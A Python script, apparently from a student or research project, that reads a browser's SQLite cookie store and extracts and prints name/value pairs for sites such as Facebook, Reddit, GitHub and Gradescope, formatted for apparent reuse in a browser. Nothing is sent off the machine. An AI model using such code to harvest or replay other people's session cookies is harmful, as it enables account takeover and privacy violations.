import requests
import sqlite3
import json
import sys
import time

#gets a smaller site list so we don't test lots of random sites
def GetSiteList() -> 'list[str]':
    siteList = [
        "facebook",
        "reddit",
        "piazza",
        #"bu.edu",
        "twitter",
        #"google",
        #"gmail",
        "stackoverflow",
        #".gov",
        #".org",
        "geeksforgeeks",
        "gradescope",
        "github",
    ]
    return siteList
def CreateCookiesForSession(cursor:sqlite3.Cursor, host_key:str) -> "list[dict]":
    """
    returns a list of all cookies for a certain host key.
    cursor is an sqlite3 cursor.
    host_key is the host_key for the website we are trying to parse.
    """
    cursor.execute('SELECT name, value FROM cookies WHERE host_key LIKE ? || "%%"', ('%' + host_key + '%',))

    cookieList:"list[dict]" = []
    for name, value in cursor.fetchall():
        # filter out values that will give the js an issue (could url encode it)
        if '"' in name or '"' in value:
            continue
        cookie:dict[str, str] = {
            'name':name,
            'value':value,
        }
        cookieList.append(cookie)
    return cookieList

def ConvertCookiesToString(cookies:"list[dict]") -> "str":
    cookieList = []
    for cookie in cookies:
        cookieStr = ""
        cookieStr += str(cookie['name'])
        cookieStr += "="
        cookieStr += str(cookie['value'])
        cookieList.append(cookieStr)
    return json.dumps(cookieList)

def GetCookies(domain:str) -> str:
    # Connect to the Database
    conn = sqlite3.connect('./Cookies')
    cursor = conn.cursor()

    cookies = CreateCookiesForSession(cursor, domain)
    cookieList = ConvertCookiesToString(cookies)
    return cookieList

if __name__ == '__main__':
    if (len(sys.argv) < 2):
        print("PLEASE PROVIDE A LIST OF DOMAINS TO GET COOKIES FOR")
    else:
        print('*'*120)
        for domain in sys.argv[1:]:
            cookie = GetCookies(domain)
            print('DOMAIN: ' + domain)
            print(cookie)
            print('*'*120)

def GetDomainList(short:bool=True) -> 'list[str]':
    # Connect to the Database
    conn = sqlite3.connect('./Cookies')
    cursor = conn.cursor()

    shortList = GetSiteList()

    cursor.execute('SELECT host_key FROM cookies')
    domains = []
    for hostKey, in cursor.fetchall():
        hostKey = str(hostKey)
        #remove the www.
        sKey = hostKey.split("www.")
        key = ""
        # need this loop bc some keys are .www. and some are www.
        for k in sKey:
            if len(k) > 2:
                assert key == ""
                key = k

        if key[0] != ".":
            key = "." + key

        if key not in domains:
            if short:
                for site in shortList:
                    if site in key:
                        domains.append(key)
                        break
            else:
                domains.append(key)

    return domains
